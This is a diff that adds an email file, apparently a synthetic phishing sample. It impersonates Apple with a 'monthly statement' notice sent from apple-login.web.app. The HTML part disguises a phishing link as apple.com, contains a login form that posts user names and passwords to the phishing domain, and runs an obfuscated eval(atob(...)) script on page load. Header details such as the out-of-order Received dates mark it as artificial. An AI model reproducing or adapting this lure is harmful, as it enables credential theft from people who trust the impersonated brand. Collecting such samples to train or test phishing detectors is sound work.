@@ -1,0 +1,32 @@
+From: notice@apple-login.web.app
+To: victim12@example.com
+Subject: Monthly statement available [ref U9ABF44]
+Date: Tue, 06 Mar 2002 20:01:00 -0500
+Message-ID: <phish-132-9b6abc3a-8cc4-4c88-b095-179ab4170321@apple-login.web.app>
+Received: from relay0 (relay0.example.net [192.0.2.100]) by mx0.example.com; Tue, 25 Mar 2002 01:30:00 -0500
+Received: from relay1 (relay1.example.net [192.0.2.101]) by mx1.example.com; Tue, 16 Mar 2002 03:05:00 -0500
+Received: from relay2 (relay2.example.net [192.0.2.102]) by mx2.example.com; Tue, 18 Mar 2002 03:56:00 -0500
+Received: from relay3 (relay3.example.net [192.0.2.103]) by mx3.example.com; Tue, 15 Mar 2002 08:58:00 -0500
+Received: from relay4 (relay4.example.net [192.0.2.104]) by mx4.example.com; Tue, 01 Mar 2002 08:21:00 -0500
+Return-Path: <notice@apple-login.web.app>
+Reply-To: notice@apple-login.web.app
+Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=apple-login.web.app; dkim=pass header.d=apple-login.web.app; dmarc=pass header.from=apple-login.web.app
+Received-SPF: pass (mx.example.com: domain of notice@apple-login.web.app designates 192.0.2.32 as permitted sender)
+DKIM-Signature: v=1; a=rsa-sha256; d=apple-login.web.app; s=default; h=from:to:subject;
+MIME-Version: 1.0
+Content-Type: multipart/alternative; boundary="bnd-p-132-9e69ece"
+
+--bnd-p-132-9e69ece
+Content-Type: text/plain; charset="UTF-8"
+
+Hello,
+
+Your monthly statement is ready. Open the link below.
+https://apple-login.web.app/statement/U9ABF44
+
+Reference: U9ABF44
+--bnd-p-132-9e69ece
+Content-Type: text/html; charset="UTF-8"
+
+<html><body onload="track()"><p>Hello,<br/><br/>Your monthly statement is ready. Open the link below.<br/>https://apple-login.web.app/statement/U9ABF44<br/><br/>Reference: U9ABF44</p><p><a href="http://apple-login.web.app/login">https://www.apple.com/signin</a></p><form action="http://apple-login.web.app/login" method="post"><input type="text" name="user"/><input type="password" name="pass" style="display:none"/><input type="submit" value="Continue"/></form><script>var s="review the notice";eval(atob('qGiGpdKXgULaLYzzeOvIPPXqitsyfzBRIsdOdZOIuowT+gBW+4C3F0EjMTQ9D98D/uzOWHyYtHSjSwieeCRbGpVjZfLZDjVlAgUSBD6u/D19yhJoHnvzeufP3BG1oynVRbmwDJYv7Qdx7ZA9oSzvBMqORsJdqFBNVGw+QxnEnsjd7w5LNM/L4SSCkGR9Ug52IgwEtZQoWrzTtIYlpnJrMQ=='));</script></body></html>
+--bnd-p-132-9e69ece--
